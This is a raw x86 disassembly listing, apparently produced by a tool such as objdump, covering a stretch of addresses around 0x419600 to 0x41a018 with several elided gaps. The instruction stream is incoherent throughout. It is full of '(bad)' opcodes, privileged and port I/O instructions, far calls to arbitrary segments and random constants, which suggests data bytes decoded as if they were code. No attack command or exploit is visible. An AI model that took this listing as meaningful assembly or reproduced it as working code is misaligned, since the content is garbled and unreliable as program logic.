  41958c:	mov    al,ds:0xce426e2d
  419591:	fs mov ebx,0x4bc3a93c
  419597:	test   BYTE PTR [ebp+0xd],al
  41959a:	popa   
  41959b:	jl     0x41953b
  41959d:	icebp  
  41959e:	addr16 mov ebx,0x968dc53f
  4195a4:	xchg   esi,eax
  4195a5:	pop    ecx
  4195a6:	jg     0x419617
  4195a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4195a9:	cmp    al,0x87
  4195ab:	es in  al,dx
  4195ad:	mov    es,WORD PTR [ebx-0x18f4d839]
  4195b3:	scas   eax,DWORD PTR es:[edi]
  4195b4:	push   ecx
  4195b5:	fsub   DWORD PTR [esi]
  4195b7:	(bad)  
  4195b8:	retf   0xa4c9
  4195bb:	sub    al,0x77
  4195bd:	sti    
  4195be:	fsubr  DWORD PTR [esp+ecx*1-0x7a]
  4195c2:	scas   al,BYTE PTR es:[edi]
  4195c3:	jle    0x419598
  4195c5:	pop    ebx
  4195c6:	out    dx,al
  4195c7:	cwde   
  4195c8:	xor    dl,BYTE PTR ds:[ecx-0x1b428c7c]
  4195cf:	mov    bl,ah
  4195d1:	mov    ecx,0x47c57139
  4195d6:	mov    eax,0xc266c6f8
  4195db:	retf   0xf81d
  4195de:	pop    ss
  4195df:	xor    BYTE PTR [ebp-0x789b01e0],ah
  4195e5:	jo     0x4195d4
  4195e7:	stc    
  4195e8:	cmp    dl,BYTE PTR [ecx]
  4195ea:	or     dh,0x56
  4195ed:	loopne 0x4195ef
	...
  419653:	add    BYTE PTR [eax],al
  419655:	add    BYTE PTR [edi-0x9d722c],ch
  41965b:	jnp    0x41964c
  41965d:	fstp   st(1)
  41965f:	fcomp  QWORD PTR [ebx+0x2f]
  419662:	rcl    BYTE PTR ds:[ebp+0x8],cl
  419666:	adc    DWORD PTR [bx+di],eax
  419669:	add    BYTE PTR [eax],al
  41966b:	add    DWORD PTR [eax],eax
  41966d:	add    BYTE PTR [ebp+eax*1+0x3757f0a5],dl
  419674:	leave  
  419675:	and    eax,0x989dd5db
  41967a:	jne    0x419643
  41967c:	xor    BYTE PTR [edi],al
  41967e:	retf   
  41967f:	xchg   edx,eax
  419680:	daa    
  419681:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419682:	push   edx
  419683:	xor    eax,DWORD PTR [ebp-0x629c703c]
  419689:	lock shr BYTE PTR [esi+0x2a],cl
  41968d:	lods   eax,DWORD PTR ds:[esi]
  41968e:	lock out 0x9e,eax
  419691:	mov    al,0x62
  419693:	mov    eax,0x1001a1ea
  419698:	jmp    0x419635
  41969a:	lahf   
  41969b:	adc    dl,dl
  41969d:	ret    
  41969e:	std    
  41969f:	and    al,0x76
  4196a1:	add    BYTE PTR ds:0xfd2aad29,dh
  4196a7:	or     BYTE PTR [ebx],dh
  4196a9:	push   ebx
  4196aa:	das    
  4196ab:	mov    WORD PTR [ebp+ebx*2+0x44],?
  4196af:	icebp  
  4196b0:	(bad)  
  4196b1:	faddp  st(3),st
  4196b3:	in     eax,0x95
  4196b5:	cmp    ch,BYTE PTR [edx+ebx*1-0x70]
  4196b9:	icebp  
  4196ba:	xor    eax,0xf95c285d
  4196bf:	inc    edx
  4196c0:	lgs    esi,FWORD PTR [ebp+0x78]
  4196c4:	mov    ecx,0x7609f909
  4196c9:	pavgb  mm6,QWORD PTR [esi+eiz*8+0x10]
  4196ce:	push   edi
  4196cf:	sub    ecx,DWORD PTR [edx+0x4b00aa73]
  4196d5:	call   0x79a3:0x1de8d4a2
  4196dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4196dd:	call   0xdd6e:0x38551dbe
  4196e4:	imul   ebp,DWORD PTR [esp+ebp*4+0x6f],0xb16b5587
  4196ec:	cdq    
  4196ed:	pop    es
  4196ee:	dec    ecx
  4196ef:	mov    eax,0xd5246317
  4196f4:	ret    
  4196f5:	pop    ss
  4196f6:	cmp    ebp,ebx
  4196f8:	mov    al,ds:0x7bd0bc2b
  4196fd:	sub    al,0xfa
  4196ff:	pop    es
  419700:	cwd    
  419702:	cmp    eax,ebp
  419704:	mov    esi,0x6db676e4
  419709:	adc    bh,0x83
  41970c:	adc    dl,BYTE PTR [ebp-0x412391a]
  419712:	xor    BYTE PTR [ebx-0x2d],bh
  419715:	push   ecx
  419716:	sar    BYTE PTR [edx],1
  419718:	dec    ecx
  419719:	fmul   st(3),st
  41971b:	mov    bl,0xa0
  41971d:	loop   0x4196b6
  41971f:	mov    edi,0xc209e981
  419724:	mov    ebp,0x24fdb671
  419729:	lods   al,BYTE PTR ds:[esi]
  41972a:	jmp    0xd241:0xf7698882
  419731:	pop    eax
  419732:	add    BYTE PTR [edx-0x1b6a276],ah
  419738:	pop    edx
  419739:	push   edx
  41973a:	out    dx,al
  41973b:	mov    dl,0xe9
  41973d:	push   ebx
  41973e:	test   al,0x79
  419740:	mov    ecx,0xc1371553
  419745:	mov    eax,0x5cd77ffe
  41974a:	jo     0x419736
  41974c:	pop    edx
  41974d:	fild   WORD PTR [ecx]
  41974f:	sub    BYTE PTR [ebp+0x74af3ef6],ah
  419755:	mov    edx,0x2a051d2
  41975a:	pusha  
  41975b:	leave  
  41975c:	jecxz  0x41977b
  41975e:	push   eax
  41975f:	push   esi
  419760:	sbb    ch,BYTE PTR [esi-0x7e2e3ea9]
  419766:	dec    edx
  419767:	cli    
  419768:	shr    DWORD PTR [ecx-0x200bdd3b],cl
	...
  4197d6:	mov    bl,0x3f
  4197d8:	jno    0x41983f
  4197da:	std    
  4197db:	outs   dx,DWORD PTR ds:[esi]
  4197dc:	mov    bh,0xff
  4197de:	add    eax,0xac8dd0ae
  4197e3:	jb     0x419833
  4197e5:	push   0x11267
  4197ea:	add    BYTE PTR [ecx],al
  4197ec:	add    BYTE PTR [eax],al
  4197ee:	push   edx
  4197ef:	jle    0x4197bc
  4197f1:	nop
  4197f2:	mov    ds,esi
  4197f4:	shr    DWORD PTR [ecx-0x14],1
  4197f7:	cmp    BYTE PTR ds:0xbfef331,ah
  4197fd:	inc    esi
  4197fe:	lods   al,BYTE PTR ds:[esi]
  4197ff:	je     0x41986a
  419801:	adc    DWORD PTR [edx-0x5198b9c],ebx
  419807:	shl    BYTE PTR ds:0x157d7503,cl
  41980d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41980e:	loop   0x41983e
  419810:	add    al,BYTE PTR [eax+eax*1-0x1f7f25ac]
  419817:	dec    ebp
  419818:	jecxz  0x4197ab
  41981a:	mov    al,ds:0x7804f841
  41981f:	iret   
  419820:	mov    edx,0x6017f532
  419825:	sub    BYTE PTR [ebx+0x54725425],al
  41982b:	mov    esi,0xd093f468
  419830:	push   0xffffffba
  419832:	pop    esp
  419833:	adc    esi,edi
  419835:	sub    al,0x67
  419837:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419838:	mov    eax,ds:0x1a356f8b
  41983d:	adc    eax,DWORD PTR [esp+ecx*8+0x1236a5ae]
  419844:	cwde   
  419845:	popf   
  419846:	sti    
  419847:	gs inc edx
  419849:	out    dx,eax
  41984a:	dec    ecx
  41984b:	pop    eax
  41984c:	push   ebx
  41984d:	aaa    
  41984e:	mov    ah,0x78
  419850:	inc    edx
  419851:	cdq    
  419852:	out    0x83,eax
  419854:	in     al,0x12
  419856:	idiv   BYTE PTR [ecx-0x2d]
  419859:	ins    BYTE PTR es:[edi],dx
  41985a:	fs mov al,0x95
  41985d:	sbb    DWORD PTR [esi+0x7e],ebp
  419860:	retf   0x96ed
  419863:	dec    ebp
  419864:	pop    edi
  419865:	push   0xffffff96
  419867:	test   BYTE PTR [edi+0x3604bf3a],cl
  41986d:	dec    esi
  41986e:	xor    eax,0x27bd3c94
  419873:	ror    BYTE PTR [ecx+edx*1],cl
  419876:	add    eax,0xce5d5049
  41987b:	adc    edi,DWORD PTR [edx]
  41987d:	xchg   edi,eax
  41987e:	inc    edx
  41987f:	dec    edi
  419880:	or     al,0xfd
  419882:	rol    DWORD PTR [ebp-0x1b],1
  419885:	nop
  419886:	jae    0x4198a4
  419888:	retf   0x810b
  41988b:	xor    cl,cl
  41988d:	mov    edx,0x528d2173
  419892:	div    BYTE PTR [edx+0x62641d1e]
  419898:	adc    eax,0xa5094604
  41989d:	pusha  
  41989e:	outs   dx,BYTE PTR ds:[esi]
  41989f:	xchg   ebp,eax
  4198a0:	lea    ebx,[esi+0x5e]
  4198a3:	cwde   
  4198a4:	xor    al,0xee
  4198a6:	xor    ebx,DWORD PTR [edx]
  4198a8:	hlt    
  4198a9:	pushf  
  4198aa:	inc    ebp
  4198ab:	jnp    0x4198e9
  4198ad:	cld    
  4198ae:	inc    ecx
  4198af:	cld    
  4198b0:	inc    esi
  4198b1:	cwde   
  4198b2:	mov    DWORD PTR [ebp+0x59],esp
  4198b5:	imul   esp,edx,0xcc96b0bd
  4198bb:	mov    ecx,0x83c3126f
  4198c0:	jle    0x41990f
  4198c2:	cmp    bh,BYTE PTR [esi+0x7b]
  4198c5:	lock pushf 
  4198c7:	xchg   esp,eax
  4198c8:	ret    0xbe3c
  4198cb:	mov    dl,0x8a
  4198cd:	pop    eax
  4198ce:	dec    edx
  4198cf:	mov    WORD PTR [edi-0x3bf279ec],fs
  4198d5:	adc    edi,DWORD PTR [edi-0x7ab95269]
  4198db:	retf   0x2632
  4198de:	sbb    DWORD PTR [eax+0x3a],ecx
  4198e1:	pop    edx
  4198e2:	cmp    esp,DWORD PTR [edx+0x60682267]
  4198e8:	fmulp  st(3),st
  4198ea:	jecxz  0x419905
  4198ec:	sub    eax,edx
	...
  419956:	sbb    BYTE PTR [ecx],0x47
  419959:	loope  0x41993a
  41995b:	jmp    DWORD PTR [esi+0x45e3657b]
  419961:	fstp   QWORD PTR [esi-0x29]
  419964:	xor    DWORD PTR [ecx],edx
  419966:	adc    eax,DWORD PTR [bx+di]
  419969:	add    BYTE PTR [eax],al
  41996b:	add    DWORD PTR [eax],eax
  41996d:	add    dh,dl
  41996f:	push   0x68135856
  419974:	push   eax
  419975:	cs repnz rdmsr 
  419979:	imul   edx,DWORD PTR [eax+0x5265da3d],0x2e0e3abe
  419983:	sub    eax,0x53eeea25
  419988:	and    ax,0xd469
  41998c:	pop    ecx
  41998d:	out    dx,al
  41998e:	push   es
  41998f:	push   ebx
  419990:	cmp    eax,DWORD PTR [edi]
  419992:	pop    ebp
  419993:	fld    QWORD PTR [ebp+0x54]
  419996:	inc    esp
  419997:	into   
  419998:	call   0x4ed47eb4
  41999d:	bound  esi,QWORD PTR [ebp-0x1a76104d]
  4199a3:	stos   BYTE PTR es:[edi],al
  4199a4:	les    ecx,FWORD PTR [edx]
  4199a6:	push   es
  4199a7:	jl     0x419989
  4199a9:	ret    
  4199aa:	and    DWORD PTR [ecx],esi
  4199ac:	mov    ds:0x1d2efbed,eax
  4199b1:	push   ebp
  4199b2:	jg     0x4199e5
  4199b4:	stos   DWORD PTR es:[edi],eax
  4199b5:	fnstsw WORD PTR [ebx-0x40df1537]
  4199bb:	fwait
  4199bc:	add    DWORD PTR [esi+0x76aca738],0x7be3881f
  4199c6:	dec    esi
  4199c7:	cmp    al,0x28
  4199c9:	jle    0x41999b
  4199cb:	jp     0x419a20
  4199cd:	fsub   QWORD PTR [ebx+0x4e]
  4199d0:	jns    0x419a11
  4199d2:	imul   ecx,DWORD PTR es:[edx+0x9],0xffffff9c
  4199d7:	push   ebp
  4199d8:	mov    ch,0x93
  4199da:	jl     0x41998c
  4199dc:	jb     0x419994
  4199de:	(bad)  
  4199df:	aam    0x7c
  4199e1:	or     eax,0xfc323e3b
  4199e6:	push   edi
  4199e7:	jp     0x419a21
  4199e9:	dec    esp
  4199ea:	push   eax
  4199eb:	aaa    
  4199ec:	xchg   esp,eax
  4199ed:	les    esi,FWORD PTR [ecx+0x6097c9ed]
  4199f3:	lea    ebx,[ebp-0x5]
  4199f6:	jno    0x419a39
  4199f8:	mov    ah,0xdb
  4199fa:	pop    ebx
  4199fb:	popa   
  4199fc:	jecxz  0x419a79
  4199fe:	shl    DWORD PTR [eax],1
  419a00:	loop   0x4199cc
  419a02:	pop    ebp
  419a03:	inc    esi
  419a04:	lea    esi,[ebx]
  419a06:	push   0x61
  419a08:	pusha  
  419a09:	mov    eax,ds:0x37801e00
  419a0e:	test   eax,0xdb51491d
  419a13:	xchg   esp,eax
  419a14:	lea    eax,[ebp+0x29]
  419a17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a18:	cmp    eax,0x4573a7b8
  419a1d:	jp     0x419a47
  419a1f:	in     al,0xba
  419a21:	ds dec edi
  419a23:	out    0x16,eax
  419a25:	cmp    al,0x99
  419a27:	adc    al,BYTE PTR [esi]
  419a29:	ins    DWORD PTR es:[edi],dx
  419a2a:	mov    dl,0x76
  419a2c:	or     ah,BYTE PTR [edx]
  419a2e:	add    ebx,eax
  419a30:	(bad)  
  419a31:	jle    0x4199c5
  419a33:	jecxz  0x4199e2
  419a35:	and    DWORD PTR [esi+0x47],eax
  419a38:	repnz mul DWORD PTR [edx+0x7aa34aef]
  419a3f:	test   BYTE PTR [edi+ecx*1],0xec
  419a43:	js     0x4199f0
  419a45:	daa    
  419a46:	in     eax,0x9
  419a48:	mov    esp,0xf4c08b2a
  419a4d:	(bad)  
  419a4f:	pop    eax
  419a50:	rcl    DWORD PTR [edi-0x58c3e56e],1
  419a56:	fmul   DWORD PTR [ecx]
  419a58:	sbb    dl,BYTE PTR [eax-0x565e77d6]
  419a5e:	adc    BYTE PTR [esi],bl
  419a60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a61:	inc    eax
  419a62:	pop    edx
  419a63:	cwde   
  419a64:	xor    ebx,eax
  419a66:	mov    ebx,0xf1766b68
  419a6b:	retf   
  419a6c:	pop    ecx
  419a6d:	mov    BYTE PTR [eax],0x0
	...
  419ad4:	add    BYTE PTR [eax],al
  419ad6:	xor    esi,DWORD PTR [ecx]
  419ad8:	xchg   ebx,eax
  419ad9:	lds    edx,FWORD PTR [ebx-0x34088819]
  419adf:	rcl    DWORD PTR ds:0x1a88efc2,cl
  419ae5:	int    0x67
  419ae7:	adc    al,0x1
  419ae9:	add    BYTE PTR [eax],al
  419aeb:	add    DWORD PTR [eax],eax
  419aed:	add    BYTE PTR [edi+0x666a2b81],dl
  419af3:	mov    bl,0xc
  419af5:	sub    al,0xe7
  419af7:	xchg   esi,eax
  419af8:	mov    eax,ds:0xdaaab8a7
  419afd:	dec    ecx
  419afe:	cmp    eax,0x333d1b52
  419b03:	(bad)
  419b07:	jne    0x419b68
  419b09:	jb     0x419b0d
  419b0b:	mov    ecx,0xe3ee4966
  419b10:	xor    eax,0x33459bd8
  419b15:	sbb    eax,DWORD PTR [ebx-0x76]
  419b18:	daa    
  419b19:	int3   
  419b1a:	ret    
  419b1b:	xor    dl,ch
  419b1d:	test   eax,0xd748827f
  419b22:	xchg   esi,eax
  419b23:	mov    ds:0xb38d10a2,al
  419b28:	call   FWORD PTR [edx]
  419b2a:	push   si
  419b2c:	sub    cl,BYTE PTR [ebp+0x496bcccf]
  419b32:	inc    esp
  419b33:	bound  edi,QWORD PTR [ebx]
  419b35:	sub    cl,bh
  419b37:	sti    
  419b38:	pop    es
  419b39:	mov    ds:0xb68ecac2,eax
  419b3e:	cmp    DWORD PTR [edi+0x3577f055],eax
  419b44:	add    al,0x16
  419b46:	and    DWORD PTR [esi],ecx
  419b48:	xchg   esp,eax
  419b49:	iret   
  419b4a:	push   edi
  419b4b:	out    0x3,eax
  419b4d:	test   BYTE PTR [edi],dl
  419b4f:	inc    ebx
  419b50:	xor    edx,DWORD PTR [edx+0x6d]
  419b53:	cmp    eax,0x37e227d3
  419b58:	mov    ecx,DWORD PTR [esi-0x76ab0346]
  419b5e:	lahf   
  419b5f:	ffreep st(2)
  419b61:	jae    0x419b13
  419b63:	xchg   bl,dh
  419b65:	mov    cl,ch
  419b67:	iret   
  419b68:	outs   dx,BYTE PTR ds:[esi]
  419b69:	push   eax
  419b6a:	je     0x419b00
  419b6c:	jmp    0x419b96
  419b6e:	push   ss
  419b6f:	cmovno esp,DWORD PTR [ecx+ebx*2+0x3b]
  419b74:	test   DWORD PTR [ecx+0x1d],0x4e8cb99c
  419b7b:	jp     0x419b4d
  419b7d:	pop    eax
  419b7e:	xchg   ecx,eax
  419b7f:	mov    bh,0x4b
  419b81:	sub    ebp,ebx
  419b83:	mov    dl,0xd9
  419b85:	retf   0x88c5
  419b88:	add    al,0xeb
  419b8a:	jno    0x419b99
  419b8c:	mov    al,0x79
  419b8e:	mov    ebp,cs
  419b90:	inc    ebp
  419b91:	shl    bl,0x3a
  419b94:	test   BYTE PTR [eax],0x1e
  419b97:	mov    WORD PTR [ebx-0x4c],?
  419b9a:	stc    
  419b9b:	sti    
  419b9c:	xchg   DWORD PTR [ecx],ebp
  419b9e:	sub    esi,edx
  419ba0:	mov    bh,0x30
  419ba2:	pop    ds
  419ba3:	stos   DWORD PTR es:[edi],eax
  419ba4:	sub    eax,DWORD PTR [ebx+0x3f]
  419ba7:	hlt    
  419ba8:	adc    eax,0xfe3a31a7
  419bad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419bae:	int    0x68
  419bb0:	mov    ds,ebp
  419bb2:	aad    0xba
  419bb4:	into   
  419bb5:	or     dh,BYTE PTR [ebx+0x76108b19]
  419bbb:	jg     0x419c27
  419bbd:	inc    eax
  419bbe:	mov    bl,0x1
  419bc0:	stos   BYTE PTR es:[edi],al
  419bc1:	int    0x71
  419bc3:	clc    
  419bc4:	and    DWORD PTR [edi-0x10f5d7d7],ecx
  419bca:	dec    esi
  419bcb:	jns    0x419beb
  419bcd:	fistp  WORD PTR [edx-0x22]
  419bd0:	push   ebx
  419bd1:	inc    ebx
  419bd2:	inc    ax
  419bd4:	jo     0x419b83
  419bd6:	add    DWORD PTR [edi+0x5a117193],0x696691da
  419be0:	jg     0x419bba
  419be2:	cs pop ebp
  419be4:	sub    DWORD PTR [edx-0x31290463],ebp
  419bea:	pop    edx
  419beb:	call   0x41d4f7
	...
  419c54:	add    BYTE PTR [eax],al
  419c56:	dec    edx
  419c57:	(bad)  
  419c58:	cli    
  419c59:	inc    edi
  419c5a:	(bad)  
  419c5b:	jg     0x419c5c
  419c5d:	int    0x88
  419c5f:	xchg   ecx,eax
  419c60:	lods   al,BYTE PTR ds:[esi]
  419c61:	or     al,0xe3
  419c63:	mov    eax,ss
  419c65:	cmp    eax,0x11567
  419c6a:	add    BYTE PTR [ecx],al
  419c6c:	add    BYTE PTR [eax],al
  419c6e:	xchg   ecx,eax
  419c6f:	lods   eax,DWORD PTR ds:[esi]
  419c70:	fs fdivr st(1),st
  419c73:	sub    al,BYTE PTR [ebp-0x76]
  419c76:	cli    
  419c77:	mov    esi,0xf0d46743
  419c7c:	mov    ?,WORD PTR [esi]
  419c7e:	pop    ds
  419c7f:	sub    bh,BYTE PTR [ebp-0x76]
  419c82:	or     eax,0xf4cc1cc3
  419c87:	aas    
  419c88:	aam    0x20
  419c8a:	pop    ebx
  419c8b:	call   0xb7b4a636
  419c90:	lods   eax,DWORD PTR ds:[esi]
  419c91:	mov    ecx,0x4cb35918
  419c97:	repz and eax,DWORD PTR [edi+ecx*1+0x7e]
  419c9c:	pop    esi
  419c9d:	icebp  
  419c9e:	das    
  419c9f:	cmc    
  419ca0:	lahf   
  419ca1:	(bad)  
  419ca2:	test   al,0x10
  419ca4:	enter  0x3153,0xfb
  419ca8:	and    BYTE PTR [ebx+0x35],bl
  419cab:	loop   0x419ccf
  419cad:	call   0x79c6:0xb4d4064e
  419cb4:	pop    edi
  419cb5:	jmp    0xc341:0xe6adf1eb
  419cbc:	xchg   esi,eax
  419cbd:	rcl    BYTE PTR [esp+ecx*2],cl
  419cc0:	ins    BYTE PTR es:[edi],dx
  419cc1:	adc    al,0xca
  419cc3:	test   BYTE PTR [edx+0x3f3f6803],0x1c
  419cca:	xor    eax,0xa496393a
  419ccf:	lods   eax,DWORD PTR ds:[esi]
  419cd0:	sahf   
  419cd1:	mov    eax,0x73a51bb5
  419cd6:	mov    es,WORD PTR [ebp+0x79]
  419cd9:	push   0x3e
  419cdb:	pop    ss
  419cdc:	mov    ch,0xdb
  419cde:	mov    edx,0x6bb514
  419ce3:	mov    ebp,DWORD PTR [esi-0x1f]
  419ce6:	popa   
  419ce7:	lods   al,BYTE PTR ds:[esi]
  419ce8:	push   esi
  419ce9:	fs or  eax,0xf259d249
  419cef:	js     0x419cd6
  419cf1:	nop
  419cf2:	test   BYTE PTR [edi+0x17],cl
  419cf5:	fwait
  419cf6:	(bad)  
  419cf7:	mov    eax,ds:0x78cdfca1
  419cfc:	fs mov ebp,0x67c0966c
  419d02:	cli    
  419d03:	int3   
  419d04:	(bad)  
  419d05:	repz add eax,0xed35aea4
  419d0b:	sbb    eax,0xb2e8161d
  419d10:	sti    
  419d11:	mov    ebp,0x84f34bc
  419d16:	ins    DWORD PTR es:[edi],dx
  419d17:	pop    ebx
  419d18:	mov    ds:0xdc8e5f06,al
  419d1d:	jbe    0x419d75
  419d1f:	mov    ebx,0xf3a48fee
  419d24:	icebp  
  419d25:	mov    ch,0x9e
  419d27:	fisubr DWORD PTR [esi+0x1a83e4a]
  419d2d:	out    0x48,al
  419d2f:	and    edx,eax
  419d31:	and    eax,0x3d047f76
  419d36:	mov    esp,eax
  419d38:	jge    0x419da0
  419d3a:	lods   al,BYTE PTR ds:[esi]
  419d3b:	and    eax,0xe990a8e7
  419d40:	into   
  419d41:	push   ebp
  419d42:	es mov dh,0xe2
  419d45:	jo     0x419ce1
  419d47:	sahf   
  419d48:	les    edx,FWORD PTR [edx-0x6d]
  419d4b:	fs xchg esp,eax
  419d4d:	add    dl,BYTE PTR [esp+eax*8-0x2eae6afe]
  419d54:	out    dx,eax
  419d55:	cli    
  419d56:	push   edx
  419d57:	bswap  edx
  419d59:	dec    ecx
  419d5a:	das    
  419d5b:	int    0xfc
  419d5d:	mul    BYTE PTR [ebx+esi*1]
  419d60:	into   
  419d61:	call   0x5f89:0x4cb9931a
  419d68:	jae    0x419dc5
  419d6a:	mov    al,ds:0x4e08c2
	...
  419dd3:	add    BYTE PTR [eax],al
  419dd5:	add    al,dh
  419dd7:	xchg   edi,eax
  419dd8:	std    
  419dd9:	cmp    al,0xff
  419ddb:	jle    0x419dce
  419ddd:	fistp  QWORD PTR [edi-0x16]
  419de0:	fisubr DWORD PTR ss:[esi+0x67f98a3c]
  419de7:	push   ss
  419de8:	add    DWORD PTR [eax],eax
  419dea:	add    BYTE PTR [ecx],al
  419dec:	add    BYTE PTR [eax],al
  419dee:	push   0x439161fc
  419df3:	(bad)  
  419df4:	jl     0x419e2e
  419df6:	sub    BYTE PTR [eax-0x5eaabffe],cl
  419dfc:	adc    BYTE PTR [edi+0x72948b17],0x41
  419e03:	pusha  
  419e04:	xchg   ebp,eax
  419e05:	ins    DWORD PTR es:[edi],dx
  419e06:	dec    edi
  419e07:	inc    esp
  419e08:	mov    ?,WORD PTR [esi+ebx*4-0x5840c60f]
  419e0f:	shr    BYTE PTR [ebx-0x3c],1
  419e12:	adc    eax,0xbca15ec9
  419e17:	shl    ch,1
  419e19:	push   esp
  419e1a:	pop    ecx
  419e1b:	and    eax,0x3bbb0e15
  419e20:	es (bad) 
  419e22:	dec    esp
  419e23:	xchg   esp,eax
  419e24:	ret    
  419e25:	sti    
  419e26:	ins    DWORD PTR es:[edi],dx
  419e27:	add    DWORD PTR [eiz*4+0x3d5ddda0],ebx
  419e2e:	int3   
  419e2f:	aaa    
  419e30:	stos   DWORD PTR es:[edi],eax
  419e31:	cld    
  419e32:	cmp    eax,0x159c0cfe
  419e37:	cwde   
  419e38:	pop    ecx
  419e39:	jae    0x419eb9
  419e3b:	pop    ebp
  419e3c:	daa    
  419e3d:	pop    ebx
  419e3e:	bound  ebp,QWORD PTR ds:0xf7d29b56
  419e44:	inc    ebp
  419e45:	(bad)  
  419e46:	xor    ch,ah
  419e48:	jb     0x419eab
  419e4a:	(bad)  
  419e4b:	fist   DWORD PTR [eax-0x1a]
  419e4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e4f:	cdq    
  419e50:	mov    edi,0x313331ba
  419e55:	cmp    ebp,ecx
  419e57:	xor    eax,0x4b30c68f
  419e5c:	es mov bh,0xa2
  419e5f:	cmp    eax,0xfce6a575
  419e64:	inc    esp
  419e65:	xlat   BYTE PTR ds:[ebx]
  419e66:	fcomp  DWORD PTR [ebx+0x4c]
  419e69:	sti    
  419e6a:	enter  0xf737,0xd1
  419e6e:	ficom  DWORD PTR [eax+ebp*4]
  419e71:	fisubr DWORD PTR [esi]
  419e73:	push   esp
  419e74:	ror    DWORD PTR [edx],cl
  419e76:	imul   ah
  419e78:	mov    ebx,0xa08f84
  419e7d:	fild   WORD PTR [ebx]
  419e7f:	test   al,0x72
  419e81:	icebp  
  419e82:	mov    ah,bh
  419e84:	dec    eax
  419e85:	fsubr  QWORD PTR [ecx-0x31514085]
  419e8b:	cmp    ch,bl
  419e8d:	push   ds
  419e8e:	mov    ds:0xacfcc38e,al
  419e93:	sub    al,0xff
  419e95:	or     dh,dh
  419e97:	ret    0x34bf
  419e9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e9b:	xchg   ebp,eax
  419e9c:	mov    dl,0x2f
  419e9e:	scas   eax,DWORD PTR es:[edi]
  419e9f:	fstp   st(0)
  419ea1:	nop
  419ea2:	shr    BYTE PTR [edx],cl
  419ea4:	adc    BYTE PTR [eax+0x2cf9c6],ah
  419eaa:	nop
  419eab:	or     DWORD PTR [ecx+0x53a86789],esp
  419eb1:	shl    DWORD PTR [ecx-0x4f0c0579],cl
  419eb7:	stc    
  419eb8:	ficom  DWORD PTR [ebx]
  419eba:	push   eax
  419ebb:	jo     0x419f11
  419ebd:	jae    0x419eea
  419ebf:	pop    edi
  419ec0:	mov    DWORD PTR [edi],esi
  419ec2:	add    eax,DWORD PTR ds:0x1c7d5ef2
  419ec8:	jg     0x419e4a
  419eca:	dec    ebx
  419ecb:	xchg   edi,eax
  419ecc:	cli    
  419ecd:	jmp    0x9d301a41
  419ed2:	dec    ecx
  419ed3:	fwait
  419ed4:	jmp    0x419f1d
  419ed6:	pop    esi
  419ed7:	xor    bl,BYTE PTR [edx+0x14]
  419eda:	lock (bad) 
  419edc:	(bad)  
  419edd:	cmp    bh,bh
  419edf:	cmc    
  419ee0:	push   ss
  419ee1:	mov    ds:0x744fadc8,al
  419ee6:	push   0xffffffbb
  419ee8:	std    
  419ee9:	popa   
  419eea:	test   eax,0xd24224
	...
  419f53:	add    BYTE PTR [eax],al
  419f55:	add    BYTE PTR [edi+0x5fc517d8],al
  419f5b:	iret   
  419f5c:	xlat   BYTE PTR ds:[ebx]
  419f5d:	ficomp DWORD PTR [edi+ebp*4+0x55]
  419f61:	inc    esi
  419f62:	jno    0x419fb9
  419f64:	fstp   QWORD PTR [edx+0x11767]
  419f6a:	add    BYTE PTR [ecx],al
  419f6c:	add    BYTE PTR [eax],al
  419f6e:	push   ss
  419f6f:	mov    cl,0x57
  419f71:	sahf   
  419f72:	fwait
  419f73:	mov    cl,0x86
  419f75:	jnp    0x419fb4
  419f77:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  419f79:	mov    edi,0xa134a20e
  419f7e:	cmp    eax,0x5bf1dba2
  419f83:	fisubr DWORD PTR ds:0x31c7f5a0
  419f89:	mov    ds:0x858479d3,al
  419f8e:	push   cs
  419f8f:	mov    dl,BYTE PTR [eax+eax*4+0x49916e8b]
  419f96:	inc    eax
  419f97:	pop    edi
  419f98:	mov    ds:0x67c7855c,al
  419f9d:	mov    al,0xe7
  419f9f:	in     al,dx
  419fa0:	in     al,0x3b
  419fa2:	add    eax,DWORD PTR [ebx]
  419fa4:	scas   al,BYTE PTR es:[edi]
  419fa5:	push   edi
  419fa6:	adc    ecx,0x57
  419fa9:	dec    ebp
  419faa:	dec    esi
  419fab:	mov    esi,0x4db33a65
  419fb0:	and    edx,edi
  419fb2:	mov    edi,0x85b0d630
  419fb7:	paddq  xmm2,XMMWORD PTR [edi+0x38]
  419fbc:	leave  
  419fbd:	ins    BYTE PTR es:[edi],dx
  419fbe:	aam    0x67
  419fc0:	pop    esp
  419fc1:	les    esp,FWORD PTR [edi]
  419fc3:	test   al,0xc5
  419fc5:	fdiv   st(3),st
  419fc7:	push   0xea64d5b2
  419fcc:	scas   al,BYTE PTR es:[edi]
  419fcd:	test   BYTE PTR [edx-0x32c84c73],ch
  419fd3:	inc    ebp
  419fd4:	add    ecx,DWORD PTR [ebx]
  419fd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419fd7:	in     eax,dx
  419fd8:	xchg   esi,eax
  419fd9:	mov    bh,0x6b
  419fdb:	add    al,0x8c
  419fdd:	mov    eax,0x7a6a03a1
  419fe2:	mov    cs,ebp
  419fe4:	mov    dl,0x98
  419fe6:	or     eax,0x8506911a
  419feb:	stc    
  419fec:	pop    ss
  419fed:	adc    ah,BYTE PTR [eax]
  419fef:	pop    edi
  419ff0:	jge    0x419f7f
  419ff2:	jmp    0xde95f35c
  419ff7:	es xchg edi,eax
  419ff9:	sbb    al,0xa0
  419ffb:	iret   
  419ffc:	mov    ds:0x450288e4,al
  41a001:	cmp    eax,0xc11ec06b
  41a006:	xchg   esi,eax
  41a007:	adc    al,0xc2
  41a009:	(bad)  
  41a00a:	int3   
  41a00b:	js     0x41a05f
  41a00d:	sub    BYTE PTR [ebx+edi*4],bh
  41a010:	pop    edx
  41a011:	arpl   WORD PTR [esi-0x5e],sp
  41a014:	aam    0xd0
  41a016:	and    esi,DWORD PTR [esi]
  41a018:	push   eax
